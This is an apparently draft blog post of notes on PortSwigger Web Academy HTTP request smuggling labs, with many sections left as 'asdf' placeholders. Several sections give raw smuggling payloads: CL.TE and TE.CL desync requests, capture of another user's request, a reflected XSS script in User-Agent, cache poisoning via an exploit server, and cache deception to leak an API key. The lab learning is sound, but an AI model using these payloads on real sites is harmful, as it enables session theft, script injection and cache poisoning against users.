---
title: "Portswigger Web Academy: HTTP Request Smuggling"
date: 2026-03-13 # YYYY-MM-DD
description: "Desc Text."
# weight: 1
# aliases: ["/first"]
draft: true
series: ["Portswigger Web Academy"]
categories: ["PSWA", "Web App Security"]
tags: ["appsec", "pswa", "websec", "hacking"]
showToc: true
TocOpen: false
hidemeta: false
disableHLJS: true # to disable highlightjs
disableShare: false
hideSummary: true
searchHidden: true
ShowReadingTime: true
ShowBreadCrumbs: false
ShowPostNavLinks: true
ShowWordCount: false
ShowRssButtonInSectionTermList: true
UseHugoToc: true
cover:
    image: "<image path/url>" # image path/url
    alt: "<alt text>" # alt text
    caption: "<text>" # display caption under cover
    relative: false # when using page bundles set this to true
    hidden: false # only hide on current single page
    cover.responsiveImages: true
---

## 0x00: Intro & Recap

Labs: https://portswigger.net/web-security/all-labs#http-request-smuggling

## 0x01: HTTP request smuggling, confirming a CL.TE vulnerability via differential responses

Prompt:
> This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding.
> 
> To solve the lab, smuggle a request to the back-end server, so that a subsequent request for / (the web root) triggers a 404 Not Found response.
> Note
> 
> Although the lab supports HTTP/2, the intended solution requires techniques that are only possible in HTTP/1. You can manually switch protocols in Burp Repeater from the Request attributes section of the Inspector panel.
> Tip
> 
> Manually fixing the length fields in request smuggling attacks can be tricky. Our HTTP Request Smuggler Burp extension was designed to help. You can install it via the BApp Store.
> 


asdf


## 0x02: HTTP request smuggling, confirming a TE.CL vulnerability via differential responses

Prompt:
> This lab involves a front-end and back-end server, and the back-end server doesn't support chunked encoding.
> 
> To solve the lab, smuggle a request to the back-end server, so that a subsequent request for / (the web root) triggers a 404 Not Found response.
> Note
> 
> Although the lab supports HTTP/2, the intended solution requires techniques that are only possible in HTTP/1. You can manually switch protocols in Burp Repeater from the Request attributes section of the Inspector panel.
> Tip
> 
> Manually fixing the length fields in request smuggling attacks can be tricky. Our HTTP Request Smuggler Burp extension was designed to help. You can install it via the BApp Store.


struggled a lot with getting the right length on this one - easiest way is to set up a scratch pad for the current req + the next one and highlight to get lengths calculated by burp


final:
```
POST / HTTP/1.1
Host: 0a9800c603cdf6ef81c93e8e005d0034.web-security-academy.net
Content-Length: 4
Transfer-Encoding: chunked

6c
GET /404 HTTP/1.1
Host: 0a9800c603cdf6ef81c93e8e005d0034.web-security-academy.net
Content-Length: 90

x=
0


```

followed by a get to / results in 404



## 0x03: Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability

Prompt:
>  This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding. There's an admin panel at /admin, but the front-end server blocks access to it.
> 
> To solve the lab, smuggle a request to the back-end server that accesses the admin panel and deletes the user carlos.
> Note
> 
> Although the lab supports HTTP/2, the intended solution requires techniques that are only possible in HTTP/1. You can manually switch protocols in Burp Repeater from the Request attributes section of the Inspector panel.
> Tip
> 
> Manually fixing the length fields in request smuggling attacks can be tricky. Our HTTP Request Smuggler Burp extension was designed to help. You can install it via the BApp Store.


asdf

POST makes it try to go to

## 0x04: Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability

Prompt:
>  This lab involves a front-end and back-end server, and the back-end server doesn't support chunked encoding. There's an admin panel at /admin, but the front-end server blocks access to it.
> 
> To solve the lab, smuggle a request to the back-end server that accesses the admin panel and deletes the user carlos.
Note
> 
> Although the lab supports HTTP/2, the intended solution requires techniques that are only possible in HTTP/1. You can manually switch protocols in Burp Repeater from the Request attributes section of the Inspector panel.
> Tip
> 
> Manually fixing the length fields in request smuggling attacks can be tricky. Our HTTP Request Smuggler Burp extension was designed to help. You can install it via the BApp Store.


asdf

## 0x05: Exploiting HTTP request smuggling to reveal front-end request rewriting

Prompt:
>  This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding.
> 
> There's an admin panel at /admin, but it's only accessible to people with the IP address 127.0.0.1. The front-end server adds an HTTP header to incoming requests containing their IP address. It's similar to the X-Forwarded-For header but has a different name.
> 
> To solve the lab, smuggle a request to the back-end server that reveals the header that is added by the front-end server. Then smuggle a request to the back-end server that includes the added header, accesses the admin panel, and deletes the user carlos.
> Note
> 
> Although the lab supports HTTP/2, the intended solution requires techniques that are only possible in HTTP/1. You can manually switch protocols in Burp Repeater from the Request attributes section of the Inspector panel.
> Tip
> 
> Manually fixing the length fields in request smuggling attacks can be tricky. Our HTTP Request Smuggler Burp extension was designed to help. You can install it via the BApp Store.


asdf

adding this header: `X-pNuuiC-Ip: 104.63.70.82`

## 0x06: Exploiting HTTP request smuggling to capture other users' requests

Prompt:
>  This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding.
> 
> To solve the lab, smuggle a request to the back-end server that causes the next user's request to be stored in the application. Then retrieve the next user's request and use the victim user's cookies to access their account.
> Notes
> 
>     Although the lab supports HTTP/2, the intended solution requires techniques that are only possible in HTTP/1. You can manually switch protocols in Burp Repeater from the Request attributes section of the Inspector panel.
>     The lab simulates the activity of a victim user. Every few POST requests that you make to the lab, the victim user will make their own request. You might need to repeat your attack a few times to ensure that the victim user's request occurs as required.
> 
> Tip
> 
> Manually fixing the length fields in request smuggling attacks can be tricky. Our HTTP Request Smuggler Burp extension was designed to help. You can install it via the BApp Store.


asdf


```
POST / HTTP/1.1
Host: 0a3a0053031a359682ec7e9b003b0026.web-security-academy.net
Content-Length: 332
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: 0a3a0053031a359682ec7e9b003b0026.web-security-academy.net
Cookie: session=d3eEZLsIq5VchYQyHQdP02THnZtqlfsh
Content-Length: 950
Content-Type: application/x-www-form-urlencoded

csrf=fSc9fJATebAcjsLUjQsGhrZ0pUFHocrj&postId=5&name=test&email=a%40a.com&website=https%3A%2F%2Fa.a&comment=


```

## 0x07: Exploiting HTTP request smuggling to deliver reflected XSS

Prompt:
>  This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding.
> 
> The application is also vulnerable to reflected XSS via the User-Agent header.
> 
> To solve the lab, smuggle a request to the back-end server that causes the next user's request to receive a response containing an XSS exploit that executes alert(1).
> Notes
> 
>     Although the lab supports HTTP/2, the intended solution requires techniques that are only possible in HTTP/1. You can manually switch protocols in Burp Repeater from the Request attributes section of the Inspector panel.
>     The lab simulates the activity of a victim user. Every few POST requests that you make to the lab, the victim user will make their own request. You might need to repeat your attack a few times to ensure that the victim user's request occurs as required.
> 
> Tip
> 
> Manually fixing the length fields in request smuggling attacks can be tricky. Our HTTP Request Smuggler Burp extension was designed to help. You can install it via the BApp Store.


asdf

note the lack of `\r\n` on the end
```
POST / HTTP/1.1
Host: 0a4000430333e77180d803f6008600d0.web-security-academy.net
Content-Length: 209
Transfer-Encoding: chunked

0

GET /post?postId=8 HTTP/1.1
Host: 0a4000430333e77180d803f6008600d0.web-security-academy.net
Cookie: session=fchmjufVn8EIUtDCgjqEOajZ9FGUo2Q0
User-Agent: PSWAHRSTEST"><script>alert(1)</script><"
Foo: X
```

url: https://0a4000430333e77180d803f6008600d0.web-security-academy.net/post?postId=8


## 0x08: Response queue poisoning via H2.TE request smuggling

asdf

## 0x09: H2.CL request smuggling

asdf

## 0x0A: HTTP/2 request smuggling via CRLF injection

asdf

## 0x0B: HTTP/2 request splitting via CRLF injection

asdf

## 0x0C: 0.CL request smuggling

asdf

## 0x0D: CL.0 request smuggling

asdf

## 0x0E: HTTP request smuggling, basic CL.TE vulnerability

Prompt:

>  This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding. The front-end server rejects requests that aren't using the GET or POST method.  
>   
> To solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method GPOST.  
> Note  
> 
> Although the lab supports HTTP/2, the intended solution requires techniques that are only possible in HTTP/1. You can manually switch protocols in Burp Repeater from the Request attributes section of the Inspector panel.  
> Tip  
>   
> Manually fixing the length fields in request smuggling attacks can be tricky. Our HTTP Request Smuggler Burp extension was designed to help. You can install it via the BApp Store.  

Very straightforward

Understand how the requests are set up - confirming by hitting the root

```
POST / HTTP/1.1
Host: 0a8a0082037389ce81129d91006600cc.web-security-academy.net
Transfer-Encoding: chunked
Content-Length: 12

0


G


```




## 0x0F: HTTP request smuggling, basic TE.CL vulnerability

Prompt:

> This lab involves a front-end and back-end server, and the back-end server doesn't support chunked encoding. The front-end server rejects requests that aren't using the GET or POST method.
> 
> To solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method GPOST.
> Note
> Although the lab supports HTTP/2, the intended solution requires techniques that are only possible in HTTP/1. You can manually switch protocols in Burp Repeater from the Request attributes section of the Inspector panel.
> Tip
> Manually fixing the length fields in request smuggling attacks can be tricky. Our HTTP Request Smuggler Burp extension was designed to help. You can install it via the BApp Store.

Not as straightforward - need to add in a 2nd request to this one

```
POST / HTTP/1.1
Host: 0a4c00de043ec72981716772003f0060.web-security-academy.net
Transfer-Encoding: chunked
Content-Length: 3

55
GPOST / HTTP/1.1
Host: 0a4c00de043ec72981716772003f0060.web-security-academy.net


0


```
Make sure to unset 'Update content length'



## 0x10: HTTP request smuggling, obfuscating the TE header

Prompt:

> This lab involves a front-end and back-end server, and the two servers handle duplicate HTTP request headers in different ways. The front-end server rejects requests that aren't using the GET or POST method.
> 
> To solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method GPOST.
> Note
> 
> Although the lab supports HTTP/2, the intended solution requires techniques that are only possible in HTTP/1. You can manually switch protocols in Burp Repeater from the Request attributes section of the Inspector panel.
> Tip
> 
> Manually fixing the length fields in request smuggling attacks can be tricky. Our HTTP Request Smuggler Burp extension was designed to help. You can install it via the BApp Store.


asdf

helpful article: https://www.yeswehack.com/learn-bug-bounty/http-request-smuggling-guide-vulnerabilities

```
POST / HTTP/1.1
Host: 0ac500a0040c0868815bc6cb00f30085.web-security-academy.net
Transfer-Encoding: chunkedx
Transfer-Encoding: chunked
Content-Length: 6

0

G
```

## 0x11: Exploiting HTTP request smuggling to perform web cache poisoning

Prompt:

> This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding. The front-end server is configured to cache certain responses.
>
>To solve the lab, perform a request smuggling attack that causes the cache to be poisoned, such that a subsequent request for a JavaScript file receives a redirection to the exploit server. The poisoned cache should alert document.cookie.
>Notes
>
>    Although the lab supports HTTP/2, the intended solution requires techniques that are only possible in HTTP/1. You can manually switch protocols in Burp Repeater from the Request attributes section of the Inspector panel.
>    The lab simulates the activity of a victim user. Every few POST requests that you make to the lab, the victim user will make their own request. You might need to repeat your attack a few times to ensure that the victim user's request occurs as required.
>
>Tip
>
>Manually fixing the length fields in request smuggling attacks can be tricky. Our HTTP Request Smuggler Burp extension was designed to help. You can install it via the BApp Store.

Full disclosure on this one - it took me a fair bit of trial and error, and a hint from the solution to let me know I wasn't looking for HRS in the right place :) 

step 1 - find a resource that's static, that's cached - that's our target to poison
javascript is usually primed for this

resource:
```
GET /resources/js/tracking.js HTTP/1.1
Host: 0a9b006804cf1098809249aa001200b1.web-security-academy.net
Cookie: session=hgM8eI6kSUkHNCJd85bQFUWSfEAmovg3
```

normal response:
```HTTP
HTTP/1.1 200 OK
Content-Type: application/javascript; charset=utf-8
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=30
Age: 7
X-Cache: hit
Connection: close
Content-Length: 70

document.write('<img src="/resources/images/tracker.gif?page=post">');
```

step 2 - find a way to smuggle requests

initial attempt attack request:
```
POST / HTTP/1.1
Host: 0a9b006804cf1098809249aa001200b1.web-security-academy.net
Cookie: session=hgM8eI6kSUkHNCJd85bQFUWSfEAmovg3
Content-Length: 169
Transfer-Encoding: chunked

0

GET /exploit HTTP/1.1
Host: exploit-0aec006f044a100b809b48d90123007b.exploit-server.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 153

x=
```

response:
```
HTTP/1.1 404 Not Found
Content-Type: application/json; charset=utf-8
Set-Cookie: session=Hq3LvH31B1HrXJ6h6GqOxiOwANrWTKfZ; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Connection: close
Content-Length: 11

"Not Found"
```

step 3 - weaponize by finding a way to force the HRS to load our exploit

attack request:
```
POST / HTTP/1.1
Host: 0a9b006804cf1098809249aa001200b1.web-security-academy.net
Cookie: session=hgM8eI6kSUkHNCJd85bQFUWSfEAmovg3
Content-Length: 129
Transfer-Encoding: chunked

0


GET /post/next?postId=2 HTTP/1.1
Host: TESTHOST
Content-Type: application/x-www-form-urlencoded
Content-Length: 3

x=
```

next normal response:
```
HTTP/1.1 302 Found
Location: https://TESTHOST/post?postId=3
Set-Cookie: session=0ui8ZxKF4XgBElhtQ3iVbrTxrFuVjQdD; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Connection: close
Content-Length: 0


```

now we can modify the payload to have a real host, i.e. the exploit server

```
POST / HTTP/1.1
Host: 0a9b006804cf1098809249aa001200b1.web-security-academy.net
Cookie: session=hgM8eI6kSUkHNCJd85bQFUWSfEAmovg3
Content-Length: 180
Transfer-Encoding: chunked

0


GET /post/next?postId=2 HTTP/1.1
Host: exploit-0aec006f044a100b809b48d90123007b.exploit-server.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 3

x=
```

step 4 - make sure we have a payload plugged into the exploit server

exploitserver[.]jpg

step 5 - get the server to cache the response, making all clients redirect to us on the static resource call

this is the easy part - right after sending the attack payload from step 3, we immediately request `/resources/js/tracking.js` to ensure we're the first one to hit it, making it cache our exploit server response instead of the intended JS file

```
GET /resources/js/tracking.js HTTP/1.1
Host: 0a9b006804cf1098809249aa001200b1.web-security-academy.net
Cookie: session=hgM8eI6kSUkHNCJd85bQFUWSfEAmovg3
```

```HTTP
HTTP/1.1 302 Found
Location: https://exploit-0aec006f044a100b809b48d90123007b.exploit-server.net/post?postId=3
Set-Cookie: session=QhSIFaFxbVtL7d6UCPltWuNNBXmcqIKK; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=30
Age: 0
X-Cache: miss
Connection: close
Content-Length: 0
```

now we have an alert box for any client that connects to the server!

## 0x12: Exploiting HTTP request smuggling to perform web cache deception

Prompt:
> This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding. The front-end server is caching static resources.
> 
> To solve the lab, perform a request smuggling attack such that the next user's request causes their API key to be saved in the cache. Then retrieve the victim user's API key from the cache and submit it as the lab solution. You will need to wait for 30 seconds from accessing the lab before attempting to trick the victim into caching their API key.
> 
> You can log in to your own account using the following credentials: wiener:peter
> Notes
> 
> Although the lab supports HTTP/2, the intended solution requires techniques that are only possible in HTTP/1. You can manually switch protocols in Burp Repeater from the Request attributes section of the Inspector panel.
>     The lab simulates the activity of a victim user. Every few POST requests that you make to the lab, the victim user will make their own request. You might need to repeat your attack a few times to ensure that the victim user's request occurs as required.

asdf

step 1 - identify the sensitive data in the request

logging in, the my account page has an API key field in a div
verified that you can drop the `?id=wiener` param and it still returns the data

step 2 - find the HRS

detected via homepage:
```
POST / HTTP/1.1
Host: 0ab500460427f24983554bba00e600d7.web-security-academy.net
Content-Length: 6
Transfer-Encoding: chunked

0

x
```

```HTTP
HTTP/1.1 404 Not Found
Content-Type: application/json; charset=utf-8
Set-Cookie: session=f3vft7eJH0xOld5R34zXN2OiMdJuTZPK; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Connection: close
Content-Length: 11

"Not Found"
```

step 3 - find a static endpoint that is cached

As with the previous cache poison lab, tracking.js shows up as a static cached file

request
```
GET /resources/js/tracking.js HTTP/2
Host: 0ab500460427f24983554bba00e600d7.web-security-academy.net
```

response
```HTTP
HTTP/2 200 OK
Content-Type: application/javascript; charset=utf-8
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=30
Age: 0
X-Cache: hit
Content-Length: 70

document.write('<img src="/resources/images/tracker.gif?page=post">');
```

technically this could end up being _any_ of the cached files, but this is one of the first ones that stream in the proxy tab after loading the root

step 4 - point the HRS to the sensitive data

we're just putting the pieces together at this point:

```
POST / HTTP/1.1
Host: 0ab500460427f24983554bba00e600d7.web-security-academy.net
Content-Length: 37
Transfer-Encoding: chunked

0

GET /my-account HTTP/1.1
Foo: X
```

step 5 - wait for user to cache their data && call the cached endpoint

this part is annoying, but easy - just keep re-trying the deception, waiting, and refreshing the main page until it sticks the user's data into one of the cached files

easier if you filter on 'X-Cache: hit' (since a miss indicates first caching of a resource, and we shouldn't care about that state)
make sure that JS files aren't filtered, and even include images and anything you wouldn't normally think about checking - as long as it's cached, it's fair game


## 0x13: Bypassing access controls via HTTP/2 request tunnelling

asdf

## 0x14: Web cache poisoning via HTTP/2 request tunnelling

asdf

## 0x15: Client-side desync

asdf

## 0x16: Server-side pause-based request smuggling

asdf